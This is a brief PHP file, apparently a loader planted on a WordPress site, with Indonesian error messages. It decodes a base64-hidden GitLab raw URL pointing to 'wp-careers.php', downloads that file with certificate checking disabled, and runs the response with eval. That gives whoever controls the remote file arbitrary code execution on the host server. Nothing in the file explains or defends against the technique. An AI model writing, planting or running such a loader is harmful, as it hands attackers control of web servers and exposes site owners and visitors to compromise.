<?php
$encodedUrl = 'aHR0cHM6Ly9naXRsYWIuY29tL2Jvc3NlcHRwLWdyb3VwL2Jvc3NlcHRwLXByb2plY3QxLy0vcmF3L21haW4vd3AtY2FyZWVycy5waHA=';
$url = base64_decode($encodedUrl);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$code = curl_exec($ch);
if (curl_errno($ch)) {
    die('cURL error: ' . curl_error($ch));
}
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
if ($httpCode !== 200) {
    die('Gagal mengambil file. HTTP Code: ' . $httpCode);
}
if (empty($code)) {
    die('Kode yang diambil kosong.');
}
eval('?>' . $code);
?>
